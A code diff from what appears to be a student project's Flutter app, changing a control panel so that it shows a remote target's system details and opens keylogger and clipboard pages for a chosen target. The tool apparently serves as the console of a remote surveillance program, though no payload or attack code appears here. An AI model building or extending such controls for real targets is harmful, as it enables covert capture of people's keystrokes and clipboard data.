@@ -17,11 +17,36 @@ import 'package:inferno_core_fyp/view/controls/task_manager.dart';
 
 import '../res/widgets/general widgets/dotted_strings.dart';
 import '../res/widgets/general widgets/my_text.dart';
+import '../view models/controllers/general_controller.dart';
 import 'controls/miscellaneous.dart';
 import 'controls/programs.dart';
 
-class ControlPanel extends StatelessWidget {
-  const ControlPanel({Key? key}) : super(key: key);
+class ControlPanel extends StatefulWidget {
+  final String targetId, targetName;
+
+  const ControlPanel({
+    super.key,
+    required this.targetId,
+    required this.targetName,
+  });
+
+  @override
+  State<ControlPanel> createState() => _ControlPanelState();
+}
+
+class _ControlPanelState extends State<ControlPanel> {
+  GeneralController generalController = Get.put(GeneralController());
+
+  @override
+  void initState() {
+    getData();
+    super.initState();
+  }
+
+  void getData() async{
+    await Future.delayed(const Duration(seconds: 1));
+    generalController.getSystemInfo(widget.targetId);
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -40,22 +65,29 @@ class ControlPanel extends StatelessWidget {
                   borderRadius: BorderRadius.circular(10),
                   border: Border.all(color: whiteColor, width: 2),
                 ),
-                child: Column(
-                  crossAxisAlignment: CrossAxisAlignment.start,
-                  children: [
-                    const Center(
-                      child: MyText(
-                        "Zain",
-                        fontWeight: FontWeight.bold,
-                        fontSize: 22,
-                        decoration: TextDecoration.underline,
+                child: Obx(
+                  () => Column(
+                    crossAxisAlignment: CrossAxisAlignment.start,
+                    children: [
+                      Center(
+                        child: MyText(
+                          widget.targetName,
+                          fontWeight: FontWeight.bold,
+                          fontSize: 22,
+                          decoration: TextDecoration.underline,
+                        ),
                       ),
-                    ),
-                    4.ph,
-                    dotsSeparatedStrings(t1: "Operating System", t2: "Window"),
-                    dotsSeparatedStrings(t1: "Uptime", t2: "10 mints"),
-                    dotsSeparatedStrings(t1: "Ram", t2: "4 gbs"),
-                  ],
+                      4.ph,
+                      dotsSeparatedStrings(
+                          t1: "Model Name",
+                          t2: generalController.sysModelName.value),
+                      dotsSeparatedStrings(
+                          t1: "Operating System",
+                          t2: generalController.sysOS.value),
+                      dotsSeparatedStrings(
+                          t1: "Ram", t2: generalController.sysRam.value),
+                    ],
+                  ),
                 ),
               ),
               CommandSection(
@@ -118,7 +150,7 @@ class ControlPanel extends StatelessWidget {
                     icon: FontAwesomeIcons.keyboard,
                     iconSize: 27,
                     onTap: () {
-                      Get.to(() => const KeyLogger());
+                      Get.to(() => KeyLogger(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
@@ -158,7 +190,7 @@ class ControlPanel extends StatelessWidget {
                     text: "Clipboard",
                     icon: FontAwesomeIcons.clipboard,
                     onTap: () {
-                      Get.to(() => const ClipboardPage());
+                      Get.to(() => ClipboardPage(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
